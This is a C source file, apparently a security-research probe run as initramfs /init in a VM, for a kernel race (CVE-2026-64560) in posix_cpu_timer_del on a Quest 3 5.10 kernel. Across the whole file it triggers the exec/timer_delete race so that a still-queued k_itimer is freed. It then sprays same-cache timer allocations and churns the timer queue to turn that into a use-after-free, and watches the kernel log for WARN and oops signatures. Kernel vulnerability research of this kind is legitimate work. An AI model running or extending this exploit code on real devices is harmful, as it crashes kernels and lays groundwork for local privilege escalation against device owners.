/*
 * CVE-2026-64560 race probe for the Quest 3 stock-source kernel (5.10.246).
 *
 * The buggy posix_cpu_timer_del() performs one PID lookup, then reads the
 * target task's sighand pointer. If a non-leader exec() concurrently runs
 * de_thread() -> transfer_pid() -> release_task(leader) -> __exit_signal()
 * clearing the old leader's sighand, the delete path returns success without
 * dequeuing the armed process-CPU timer, and sys_timer_delete() then frees
 * the k_itimer while its timerqueue node stays linked in the target's
 * thread-group cputimer queue. The first win per boot trips the
 * WARN_ON_ONCE in posix_cpu_timer_del(); later wins are silent until the
 * freed object is reused or walked.
 *
 * The deleting thread cannot belong to the exec'ing thread group: de_thread
 * waits in sig->notify_count for every sibling thread to die before it
 * reaches exchange_tids()/release_task(), so a sibling mid-timer_delete()
 * would block the exec instead of racing it. The winnable arrangement is
 * cross-process: the timer is owned by a parent process but targets the
 * child's process-CPU clock (pid_for_clock() allows this for
 * PTRACE_MODE_READ_REALCREDS, which same-uid parent/child passes).
 *
 * Per iteration the parent forks a child; the child leaves a zombie leader
 * and a non-leader thread that execve()s this binary again ("phase2") as
 * soon as the parent has armed the timer. The parent spins a tunable delay
 * after the child's go flag and then calls timer_delete(), racing the
 * child's exec critical section. Stage-A phase2 exits immediately for
 * maximum trial throughput; once the first WARN proves a win, the parent
 * switches children to stage B, which sprays timer_create() (same
 * posix_timers_cache slab) across the RCU grace period and churns the
 * thread-group cputimer queue to materialize the use-after-free.
 *
 * The parent watches the kernel log via klogctl() and correlates the WARN
 * and oops signatures with iteration numbers. As PID 1 this binary is the
 * initramfs /init: it runs the sweeps and powers the VM off.
 */

#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdatomic.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/klog.h>
#include <sys/mman.h>
#include <sys/reboot.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define MARKER_FD 3
#define SPRAY_TIMERS 32
#define CHURN_TIMERS 16
#define CASCADE_TIMERS 8
#define DHAMMER_TIMERS 1024

/* Shared parent/child handshake, inherited across fork(). */
struct race_shm {
	uint32_t timer_ready;	/* parent armed the child-targeted timer */
	uint32_t go;		/* child's exec thread is entering execve */
	uint32_t stage_b;	/* parent wants the churning phase2 */
	uint32_t near;		/* arm a short (near) expiry this trial */
};

static struct race_shm *shm;

static const char *g_self;
static timer_t g_timer;

static inline uint64_t cntvct(void)
{
	uint64_t v;

	asm volatile("mrs %0, cntvct_el0" : "=r"(v));
	return v;
}

static inline uint64_t cntfrq(void)
{
	uint64_t v;

	asm volatile("mrs %0, cntfrq_el0" : "=r"(v));
	return v;
}

static void spin_ns(uint64_t ns, uint64_t freq)
{
	uint64_t start = cntvct();
	uint64_t ticks = (uint64_t)(((double)ns / 1e9) * (double)freq) + 1;

	while (cntvct() - start < ticks)
		asm volatile("yield");
}

static void emit(const char *fmt, ...)
{
	char buf[256];
	va_list ap;

	va_start(ap, fmt);
	int n = vsnprintf(buf, sizeof(buf), fmt, ap);
	va_end(ap);
	if (n <= 0)
		return;
	if (n > (int)sizeof(buf) - 1)
		n = (int)sizeof(buf) - 1;
	/* The marker fd is best-effort; the console copy is the record. */
	if (write(MARKER_FD, buf, (size_t)n) < 0) {
	}
	if (write(STDOUT_FILENO, buf, (size_t)n) < 0) {
	}
}

static void pin(int cpu)
{
	cpu_set_t set;

	CPU_ZERO(&set);
	CPU_SET(cpu, &set);
	sched_setaffinity(0, sizeof(set), &set);
}

/* Dual-hammer context shared between the main thread (deletes) and the
 * hammer thread (settime on tms[0]). */
static uint64_t g_dual_set_hits;

struct dual_ctx {
	timer_t target;
	_Atomic int stop;
	uint64_t freq;
	uint64_t t_go;
	long iter;
};

static void *dual_setter(void *arg)
{
	struct dual_ctx *ctx = arg;
	struct itimerspec its;
	uint64_t first_ns = 0;
	int hits = 0;

	memset(&its, 0, sizeof(its));
	its.it_value.tv_sec = 10;
	while (!atomic_load_explicit(&ctx->stop, memory_order_relaxed)) {
		if (timer_settime(ctx->target, 0, &its, NULL) != 0 &&
		    errno == ESRCH) {
			if (!hits)
				first_ns = (uint64_t)
				    (((double)(cntvct() - ctx->t_go)) *
				     1e9 / (double)ctx->freq);
			hits++;
		}
	}
	if (hits)
		emit("DUAL_SETTIME_HIT iter=%ld hits=%d first_ns=%llu\n",
		     ctx->iter, hits, (unsigned long long)first_ns);
	g_dual_set_hits += hits;
	return NULL;
}

/* Child side: the non-leader thread that execve()s back into phase2. */
static void *execer(void *arg)
{
	char iterbuf[32], modebuf[8], gotimebuf[32];
	char *argv[6];
	uint32_t near, stage_b;
	uint64_t freq = cntfrq();

	(void)arg;
	pin(1);
	near = atomic_load_explicit(&shm->near, memory_order_relaxed);
	stage_b = atomic_load_explicit(&shm->stage_b, memory_order_relaxed);
	snprintf(iterbuf, sizeof(iterbuf), "%ld", (long)(intptr_t)arg);
	snprintf(modebuf, sizeof(modebuf), "%u", near | (stage_b << 1));
	argv[0] = (char *)g_self;
	argv[1] = (char *)"phase2";
	argv[2] = iterbuf;
	argv[3] = modebuf;
	argv[4] = gotimebuf;
	argv[5] = NULL;

	while (!atomic_load_explicit(&shm->timer_ready,
				     memory_order_acquire))
		asm volatile("yield");
	atomic_store_explicit(&shm->go, 1, memory_order_release);
	uint64_t t_go = cntvct();

	snprintf(gotimebuf, sizeof(gotimebuf), "%llu",
		 (unsigned long long)t_go);
	/* Spin for a moment so the parent observes go before execve enters. */
	spin_ns(2000, freq);
	execve(g_self, argv, NULL);
	emit("EXEC_FAIL iter=%s errno=%d\n", iterbuf, errno);
	_exit(1);
	return NULL;
}

static void racing_child(long iter)
{
	pthread_t th_w;

	pin(3);
	if (pthread_create(&th_w, NULL, execer, (void *)(intptr_t)iter)) {
		emit("THREAD_FAIL iter=%ld errno=%d\n", iter, errno);
		_exit(1);
	}
	/*
	 * Leader exits while the group stays alive: de_thread() finds an
	 * already-inactive leader and proceeds straight to
	 * exchange_tids()/release_task() once the exec starts.
	 */
	pthread_exit(NULL);
}

static void phase2(unsigned long iter, unsigned mode, uint64_t t_go)
{
	struct sigevent sev = { .sigev_notify = SIGEV_NONE };
	timer_t spray[SPRAY_TIMERS], churn[CHURN_TIMERS];
	struct itimerspec its;
	uint64_t freq = cntfrq();
	int anomalies = 0;

	pin(1);
	/* Report the true go->exec-complete latency; the settime window
	 * detector places de_thread() in the first ~20-40us of this. */
	emit("EXEC_LAT iter=%ld mode=%u go_to_exec_done_us=%llu\n",
	     (long)iter, mode,
	     (unsigned long long)((cntvct() - t_go) / (freq / 1000000)));
	if (!(mode & 2)) {
		/* Stage A: exit immediately; trial throughput rules. */
		_exit(0);
	}

	/*
	 * Stage B: cover the RCU grace period behind k_itimer_rcu_free()
	 * with same-cache allocations, then churn the surviving thread-group
	 * cputimer queue so any freed-but-still-queued ghost is walked,
	 * fired, aliased or erased.
	 */
	for (int cycle = 0; cycle < 24; cycle++) {
		uint64_t start;

		for (int i = 0; i < SPRAY_TIMERS; i++)
			spray[i] = (timer_t)-1;
		for (int i = 0; i < CHURN_TIMERS; i++)
			churn[i] = (timer_t)-1;

		for (int i = 0; i < SPRAY_TIMERS; i++)
			if (timer_create(CLOCK_MONOTONIC, &sev, &spray[i]))
				anomalies++;
		for (int i = 0; i < CHURN_TIMERS; i++) {
			if (timer_create(CLOCK_PROCESS_CPUTIME_ID, &sev,
					 &churn[i]))
				continue;
			memset(&its, 0, sizeof(its));
			its.it_value.tv_nsec = 100000 * (long)(i + 1);
			if (timer_settime(churn[i], 0, &its, NULL))
				anomalies++;
		}

		start = cntvct();
		while ((cntvct() - start) / (freq / 1000) < 4)
			asm volatile("yield");

		for (int i = 0; i < CHURN_TIMERS; i++)
			if (churn[i] != (timer_t)-1)
				timer_delete(churn[i]);
		for (int i = 0; i < SPRAY_TIMERS; i++)
			if (spray[i] != (timer_t)-1)
				timer_delete(spray[i]);
	}

	emit("PHASE2 iter=%ld mode=%u anomalies=%d\n", (long)iter, mode,
	     anomalies);
	_exit(0);
}

struct klog_watch {
	int warns;
	int oops;
};

static void klog_scan(struct klog_watch *watch)
{
	static char buf[16384];
	int n;

	n = klogctl(3 /* read the whole ring; tail is kept on overflow */,
		    buf, (int)sizeof(buf) - 1);
	if (n <= 0)
		return;
	buf[n] = '\0';

	int warns = 0, oops = 0;

	for (char *line = buf, *next; line && *line; line = next) {
		next = strchr(line, '\n');
		if (next)
			*next++ = '\0';
		if (!strncmp(line, "WARNING:", 8) &&
		    strstr(line, "posix_cpu_timer_del"))
			warns++;
		if (!strncmp(line, "Unable to handle kernel", 23) ||
		    !strncmp(line, "Internal error:", 15) ||
		    !strncmp(line, "BUG:", 4))
			oops++;
	}
	if (warns > watch->warns) {
		watch->warns = warns;
		emit("WATCH warn_count=%d\n", warns);
	}
	if (oops > watch->oops) {
		watch->oops = oops;
		emit("WATCH oops_count=%d\n", oops);
	}
}

static volatile sig_atomic_t g_alarm_fired;
static volatile pid_t g_child_pid;
static uint64_t g_exec_us_min, g_exec_us_max, g_exec_us_total;
static uint64_t g_exec_samples;
static uint64_t g_hammer_hits, g_hammer_calls;
static uint64_t g_last_hit_ns = 200000; /* default 200us window offset */
static int g_check_target = 1;

static void on_alarm(int sig)
{
	(void)sig;
	g_alarm_fired = 1;
	if (g_child_pid > 0)
		kill(g_child_pid, SIGKILL);
}

#define MODE_DELETE 0
#define MODE_HAMMER 1
#define MODE_CASCADE 2
#define MODE_DHAMMER 3
#define MODE_DUAL 4

static int parent_trial(long iter, uint64_t delay_ns, int near, int stage_b,
			int mode)
{
	clockid_t clkid;
	struct sigevent sev = { .sigev_notify = SIGEV_NONE };
	struct itimerspec its;

	atomic_store_explicit(&shm->timer_ready, 0, memory_order_relaxed);
	atomic_store_explicit(&shm->go, 0, memory_order_relaxed);
	atomic_store_explicit(&shm->stage_b, (uint32_t)stage_b,
			      memory_order_relaxed);
	atomic_store_explicit(&shm->near, (uint32_t)near,
			      memory_order_relaxed);

	pid_t pid = fork();

	if (pid == 0) {
		racing_child(iter);
		_exit(1);
	}
	g_child_pid = pid;

	int timer_ok = 0;
	timer_t tms[DHAMMER_TIMERS];
	int n_timers = mode == MODE_CASCADE ? CASCADE_TIMERS :
		       mode == MODE_DHAMMER || mode == MODE_DUAL ?
		       DHAMMER_TIMERS : 1;

	for (int i = 0; i < n_timers; i++)
		tms[i] = (timer_t)-1;
	if (clock_getcpuclockid(pid, &clkid) == 0) {
		timer_ok = 1;
		for (int i = 0; i < n_timers; i++) {
			if (timer_create(clkid, &sev, &tms[i]))
				timer_ok = 0;
		}
	}
	if (timer_ok) {
		memset(&its, 0, sizeof(its));
		if (near)
			its.it_value.tv_nsec = 200000;
		else
			its.it_value.tv_sec = 10;
		for (int i = 0; timer_ok && i < n_timers; i++)
			timer_ok = timer_settime(tms[i], 0, &its, NULL) == 0;
	}
	g_timer = tms[0];
	if (!timer_ok) {
		emit("ARM_FAIL iter=%ld errno=%d\n", iter, errno);
		kill(pid, SIGKILL);
		waitpid(pid, NULL, 0);
		g_child_pid = -1;
		return -1;
	}

	/* One-time validation that the timer targets the child: the
	 * remaining process-CPU time must shrink while the child spins.
	 * The window spans several scheduler ticks because group cputime
	 * accounting refreshes on tick (HZ=300 here). */
	if (g_check_target && iter == 0) {
		struct itimerspec a, b;
		uint64_t freq = cntfrq();
		uint64_t t0 = cntvct();

		timer_gettime(g_timer, &a);
		while ((cntvct() - t0) / (freq / 1000000) < 20000)
			asm volatile("yield");
		timer_gettime(g_timer, &b);
		emit("TARGET_CHECK a=%lld.%09ld b=%lld.%09ld child_pid=%d\n",
		     (long long)a.it_value.tv_sec, a.it_value.tv_nsec,
		     (long long)b.it_value.tv_sec, b.it_value.tv_nsec, pid);
	}

	atomic_store_explicit(&shm->timer_ready, 1, memory_order_release);
	uint64_t freq = cntfrq();
	uint64_t start = cntvct();

	/* The child's exec thread publishes go right before execve(). */
	while (!atomic_load_explicit(&shm->go, memory_order_acquire)) {
		if (cntvct() - start > freq / 4) { /* 250ms safety */
			emit("GO_TIMEOUT iter=%ld\n", iter);
			kill(pid, SIGKILL);
			waitpid(pid, NULL, 0);
			g_child_pid = -1;
			return -1;
		}
		asm volatile("yield");
	}
	uint64_t t_go = cntvct();

	if (mode == MODE_HAMMER) {
		/*
		 * Window detector: posix_cpu_timer_set() has the same
		 * NULL-sighand read, but its failure is a harmless, repeatable
		 * -ESRCH while the timer stays armed. Hammering it through the
		 * exec measures how often the delete-side window is observable
		 * at all, and records where the window sits relative to go.
		 */
		struct itimerspec its;
		int esrch = 0, calls = 0, ret, other = 0;

		memset(&its, 0, sizeof(its));
		its.it_value.tv_sec = 10;
		for (;;) {
			ret = timer_settime(g_timer, 0, &its, NULL);
			calls++;
			if (ret != 0) {
				if (errno == ESRCH) {
					if (!esrch)
						g_last_hit_ns = (uint64_t)
						    (((double)(cntvct() - t_go)) /
						     (double)freq * 1e9);
					esrch++;
				} else {
					other++;
				}
			}
			int st;

			if (waitpid(pid, &st, WNOHANG) == pid)
				break;
		}
		if (esrch)
			emit("WINDOW_HIT iter=%ld esrch=%d calls=%d "
			     "first_hit_ns=%llu\n", iter, esrch, calls,
			     (unsigned long long)g_last_hit_ns);
		if (iter == 0 || (iter & 0x3FF) == 0)
			emit("HAMMER iter=%ld last_calls=%d other_errno=%d "
			     "first_ret=%d\n", iter, calls, other, ret);
		g_hammer_hits += esrch;
		g_hammer_calls += calls;
		g_child_pid = -1;
		return 0;
	}

	if (mode == MODE_DHAMMER || mode == MODE_DUAL) {
		/*
		 * Delete hammer: tile the whole exec window with
		 * back-to-back timer_delete() attempts (~150ns apart with
		 * hvf), matching the settime hammer's sampling density but
		 * with the dangerous free. A win trips the WARN_ON_ONCE and
		 * frees an armed, still-queued k_itimer. MODE_DUAL adds a
		 * concurrent settime hammer on tms[0] as a matched control.
		 */
		if (mode == MODE_DUAL) {
			/*
			 * Concurrent hammers on the same exec: one thread
			 * settime-hammers tms[0] (window detector), the main
			 * thread delete-hammers tms[1..]. If settime observes
			 * the window on execs whose deletes tiled the same
			 * interval without ever tripping the WARN, the delete
			 * path's failure is structural, not statistical.
			 */
			pthread_t th;
			struct dual_ctx ctx;

			ctx.target = tms[0];
			atomic_store_explicit(&ctx.stop, 0,
					      memory_order_relaxed);
			ctx.freq = freq;
			ctx.t_go = t_go;
			ctx.iter = iter;
			pthread_create(&th, NULL, dual_setter, &ctx);
			for (int j = 1; j < DHAMMER_TIMERS; j++)
				timer_delete(tms[j]);
			atomic_store_explicit(&ctx.stop, 1,
					      memory_order_relaxed);
			pthread_join(th, NULL);
		} else {
			for (int j = 0; j < DHAMMER_TIMERS; j++) {
				timer_delete(tms[j]);
				if ((j & 7) == 7) {
					int st;

					if (waitpid(pid, &st, WNOHANG) == pid)
						break;
				}
			}
		}
		g_alarm_fired = 0;
		alarm(3);
		int st;

		while (waitpid(pid, &st, 0) < 0 && errno == EINTR)
			;
		alarm(0);
		g_child_pid = -1;
		if (g_alarm_fired)
			emit("WATCHDOG iter=%ld\n", iter);
		return 0;
	} else if (mode == MODE_CASCADE) {
		/*
		 * Calibrated delete cascade: place CASCADE_TIMERS independent
		 * timer_delete() attempts around the window offset measured by
		 * the hammer sweep, spreading them across the run so the whole
		 * jitter envelope is covered.
		 */
		uint64_t base = g_last_hit_ns;
		/* Per-trial coarse offset: -12us..+12us in 3us steps. */
		long coarse = ((long)(iter % 9) - 4) * 3000;

		for (int j = 0; j < CASCADE_TIMERS; j++) {
			/* Fine offsets: 500ns apart within ~4us. */
			int64_t want_ns = (int64_t)base + coarse * 1000 +
					  (int64_t)j * 500;
			int64_t have_ns = (int64_t)(((double)(cntvct() - t_go)) /
						    (double)freq * 1e9);

			if (want_ns > have_ns)
				spin_ns((uint64_t)(want_ns - have_ns), freq);
			timer_delete(tms[j]);
		}
	} else {
		spin_ns(delay_ns, freq);
		timer_delete(g_timer);
	}

	g_alarm_fired = 0;
	alarm(3);
	int st;

	while (waitpid(pid, &st, 0) < 0 && errno == EINTR)
		;
	alarm(0);
	g_child_pid = -1;
	if (g_alarm_fired)
		emit("WATCHDOG iter=%ld\n", iter);

	/* Telemetry: child lifetime past go covers fork-to-exec-to-exit and
	 * bounds where the exec critical section sits relative to the
	 * delay sweep. */
	uint64_t t_reap = cntvct();
	uint64_t us = (t_reap - t_go) / (freq / 1000000);

	if (g_exec_us_min == 0 || us < g_exec_us_min)
		g_exec_us_min = us;
	if (us > g_exec_us_max)
		g_exec_us_max = us;
	g_exec_us_total += us;
	g_exec_samples++;
	return 0;
}

static int run_sweep(const char *label, int near, long max_iters,
		     long budget_seconds, int mode)
{
	struct klog_watch watch = { 0, 0 };
	uint64_t freq = cntfrq();
	uint64_t start = cntvct();
	long warn_iter = -1, oops_iter = -1;
	unsigned seed = 0x64560u;

	g_hammer_hits = 0;
	g_hammer_calls = 0;
	emit("SWEEP_BEGIN label=%s near=%d mode=%d max_iters=%ld budget_s=%ld freq=%llu\n",
	     label, near, mode, max_iters, budget_seconds,
	     (unsigned long long)freq);

	for (long iter = 0; iter < max_iters; iter++) {
		double elapsed = (double)(cntvct() - start) / (double)freq;

		if (elapsed > (double)budget_seconds)
			break;

		/* Sweep the delete delay across the exec() critical window
		 * (0..800us in 2us steps) with ~2us of jitter so adjacent
		 * samples decorrelate. */
		uint64_t delay = (uint64_t)(iter % 400) * 2000u +
				 (uint64_t)(rand_r(&seed) % 2000u);

		int stage_b = watch.warns > 0;

		/* Every delete-hammer trial keeps the child alive through the
		 * RCU grace period: silent !p-path wins are otherwise always
		 * dequeued cleanly at child exit and stay invisible. */
		if (mode == MODE_DHAMMER)
			stage_b = 1;
		if (parent_trial(iter, delay, near, stage_b, mode) != 0)
			continue;

		klog_scan(&watch);
		if (watch.warns > 0 && warn_iter < 0) {
			warn_iter = iter;
			emit("WARN_FIRST label=%s iter=%ld delay_ns=%llu\n",
			     label, iter, (unsigned long long)delay);
		}
		if (watch.oops > 0 && oops_iter < 0) {
			oops_iter = iter;
			emit("OOPS_FIRST label=%s iter=%ld\n", label, iter);
		}
		if ((iter & 0x3FF) == 0)
			emit("TICK label=%s iter=%ld elapsed=%.1fs "
			     "exec_us min=%llu max=%llu avg=%llu n=%llu\n",
			     label, iter, elapsed,
			     (unsigned long long)g_exec_us_min,
			     (unsigned long long)g_exec_us_max,
			     (unsigned long long)(g_exec_samples ?
				g_exec_us_total / g_exec_samples : 0),
			     (unsigned long long)g_exec_samples);
	}

	double total = (double)(cntvct() - start) / (double)freq;

	emit("SWEEP_END label=%s seconds=%.1f warn_iter=%ld warns=%d "
	     "oops_iter=%ld oops=%d hammer_hits=%llu hammer_calls=%llu\n",
	     label, total, warn_iter, watch.warns, oops_iter, watch.oops,
	     (unsigned long long)g_hammer_hits,
	     (unsigned long long)g_hammer_calls);
	if (mode == MODE_HAMMER)
		return g_hammer_hits > 0 ? 0 : 1;
	return watch.warns > 0 ? 0 : 1;
}

static void dump_klog_tail(void)
{
	static char buf[32768];
	int n = klogctl(3, buf, (int)sizeof(buf) - 1);

	if (n <= 0)
		return;
	buf[n] = '\0';
	emit("--- klog tail ---\n%s--- klog end ---\n", buf);
}

static void lift_rlimits(void)
{
	struct rlimit rl = { RLIM_INFINITY, RLIM_INFINITY };

	setrlimit(RLIMIT_SIGPENDING, &rl);
	setrlimit(RLIMIT_NOFILE, &rl);
}

int main(int argc, char **argv)
{
	g_self = argv[0];

	if (argc >= 2 && !strcmp(argv[1], "phase2")) {
		long iter = argc >= 3 ? strtol(argv[2], NULL, 10) : -1;
		unsigned mode = argc >= 4 ? (unsigned)strtoul(argv[3], NULL, 10) : 0;
		uint64_t t_go = argc >= 5 ? strtoull(argv[4], NULL, 10) : 0;

		lift_rlimits();
		phase2(iter, mode, t_go);
	}

	lift_rlimits();
	signal(SIGALRM, on_alarm);
	g_child_pid = -1;

	shm = mmap(NULL, sizeof(*shm), PROT_READ | PROT_WRITE,
		   MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (shm == MAP_FAILED) {
		emit("MMAP_FAIL errno=%d\n", errno);
		return 2;
	}

	if (getpid() == 1) {
		/* initramfs /init: set up the marker fd, run, power off. */
		int mfd = open("/markers", O_CREAT | O_WRONLY | O_APPEND, 0600);

		if (mfd >= 0 && mfd != MARKER_FD) {
			dup2(mfd, MARKER_FD);
			close(mfd);
		}
		pin(2);
		emit("RACE_INIT pid=1 self=%s argc=%d cross_process=1\n",
		     g_self, argc);
		int rc = 0;

		rc |= run_sweep("hammer", 0, 4000000, 20, MODE_HAMMER);
		rc |= run_sweep("dual", 0, 4000000, 90, MODE_DUAL);
		rc |= run_sweep("dhammer", 0, 4000000, 240, MODE_DHAMMER);
		dump_klog_tail();
		emit("RACE_RESULT warn_seen=%d\n", rc == 0);
		sync();
		reboot(RB_POWER_OFF);
		_exit(0);
	}

	pin(0);
	emit("RACE_INIT pid=%ld self=%s argc=%d cross_process=1\n",
	     (long)getpid(), g_self, argc);
	int rc = run_sweep("shell", 0, 200000, 120, 0);

	dump_klog_tail();
	emit("RACE_RESULT warn_seen=%d\n", rc == 0);
	return rc;
}
